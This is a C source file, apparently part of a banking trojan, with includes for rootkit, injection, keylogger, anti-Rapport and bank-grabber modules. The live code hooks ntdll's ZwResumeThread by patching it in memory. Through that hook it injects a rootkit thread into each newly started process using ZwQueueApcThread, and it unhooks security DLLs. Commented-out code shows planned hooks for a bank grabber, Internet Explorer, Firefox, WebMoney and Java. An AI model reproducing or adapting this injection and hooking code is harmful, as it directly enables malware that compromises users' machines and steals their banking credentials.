#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Splice.h"
#include "Inject.h"
#include "Rootkit.h"
#include "Unhook.h"

#include "InternetExplorer.h"
#include "Java.h"
#include "KeyLogger.h"
#include "web_money_dll.h"

#include "ntdll.h"
#include "psapi.h"
#include "AntiRapport.h"

#include "BBSCBank.h"


DWORD dwAddrDirProc; // ZwQueryDirectoryFile hook
DWORD dwAddrRthProc; // ZwResumeThread hook
DWORD dwAddrOpfProc; // ZwOpenFile hook
DWORD dwAddrCrfProc; // ZwCreateFile hook


typedef NTSTATUS ( WINAPI *PZwQueryDirectoryFile )( HANDLE  FileHandle, HANDLE  Event,
							   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
							   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
							   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
							   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
							   BOOLEAN  RestartScan  );


PZwQueryDirectoryFile ZwQueryDirectoryFileReal;


void ProtectPage( LPVOID lpAddr, DWORD dwParams )
{
	DWORD dwOldProt = 0;
	pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
}

typedef NTSTATUS ( WINAPI *PZwResumeThread )( HANDLE hThread, PULONG PreviousSuspendCount );
PZwResumeThread ZwResumeThreadReal;

typedef long (CALLBACK *type_java_exception)( EXCEPTION_POINTERS * exception_data );
type_java_exception old_java_exception;

long CALLBACK java_exception( EXCEPTION_POINTERS * exception_data )
{
	OutputDebugString("java exception");
	return old_java_exception(exception_data);
}

DWORD WINAPI RootkitThread( LPVOID lpData )
{
	//DbgMsgW(L"RootkitThread?",1,L"");
	OutputDebugString("RootkitThread");
	UnhookDlls();
	HookZwResumeThread();	
/*
	if( IsBBSCBank() )
	{
		BBSGrabber();
	}

	//DbgMsgW(L"RootkitThread end?",1,L"");

	if ( HookInternetExplorer() )
	{
		return 0;
	}
	if( HookFireFox() )
	{
		return 0;
	}
	//if ( HookJava() )
	//{
	//	return 0;
	//}


	if ( IsWebMoney() )
	{
		 HookWebMoney();
	};
	//if ( HookKeyLogger() )
	//{
		//return 0;
	//}
	
	if( IsJava() )
	{
		old_java_exception = (type_java_exception)pSetUnhandledExceptionFilter(java_exception);
		HookJava();
		return 0;
	}
*/
	return 0;
}

DWORD GetPidByThread( HANDLE hThread )
{
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread( hThread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
	{
		return (DWORD)Threads.ClientId.UniqueProcess;
	}

	return -1;
}

LPDWORD dwHashPid;
DWORD dwPidCount;

void AddPid( DWORD dwPid )
{
	if ( dwHashPid == NULL )
	{
		if ( ( dwHashPid = (LPDWORD)MemAlloc( sizeof( LPDWORD ) ) ) == NULL )
		{
			return;
		}
	}
	else
	{
		LPDWORD p = (LPDWORD)MemRealloc( dwHashPid, GetMemSize( dwHashPid ) + ( sizeof( LPDWORD ) * ( dwPidCount + 1 ) ) );

		if ( p == NULL )
		{
			return;
		}

		dwHashPid = p;
	}

	dwHashPid[ dwPidCount ] = dwPid;
	dwPidCount++;

	return;
}

bool FindPid( DWORD dwPid )
{
	for ( DWORD i = 0; i < dwPidCount; i++ )
	{
		if ( dwHashPid[i] == dwPid )
		{
			return true;
		}
	}

	return false;
}

/*
void WINAPI GetNameProcess( HANDLE hProcess, char* buf, int szBuf )
{
	HMODULE modules[10];
	DWORD needed;
	buf[0] = 0;
	OutputDebugString("1");
	if( pEnumProcessModules( hProcess, modules, sizeof(modules), &needed ) )
	{
		OutputDebugString("2");
		if( pGetModuleBaseNameA( hProcess, modules[0], buf, szBuf ) != 0 )
		{
			OutputDebugString("3");
			buf[0] = 0;
		}
	}
	DbgMsg("4", 0, "%d", GetLastError());
}
*/

NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{
	DWORD dwPid = GetPidByThread( hThread );
	//OutputDebugString("ZwResumeThreadHook");
	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
			
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{
				DWORD dwAddr = InjectCode( hProcess, RootkitThread );
				if ( dwAddr != -1 )
				{
					if ( (NTSTATUS)pZwQueueApcThread( hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS ) 
					{
						AddPid( dwPid );
					}
				}
				pZwClose( hProcess );
			}		
		}
	}

	return ZwResumeThreadReal( hThread, PreviousSuspendCount );
}

__declspec( naked ) void JmpToHookRthProc()
{
	__asm
	{
		pop eax
		lea eax,ZwResumeThreadHook
		jmp eax
		retn
	}
}

void HookZwResumeThread()
{
	dwHashPid  = NULL;
	dwPidCount = 0;

	dwAddrRthProc = (DWORD)&JmpToHookRthProc;
	DWORD dwAddr  = (DWORD)&dwAddrRthProc;

	PZwResumeThread ZwResumeThread = (PZwResumeThread)GetProcAddressEx( NULL, 5, 0xACF8BF39 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwResumeThread;

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwResumeThreadReal =  (PZwResumeThread)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwResumeThreadHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );

		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwResumeThread, PAGE_EXECUTE_READ );

	return;
}







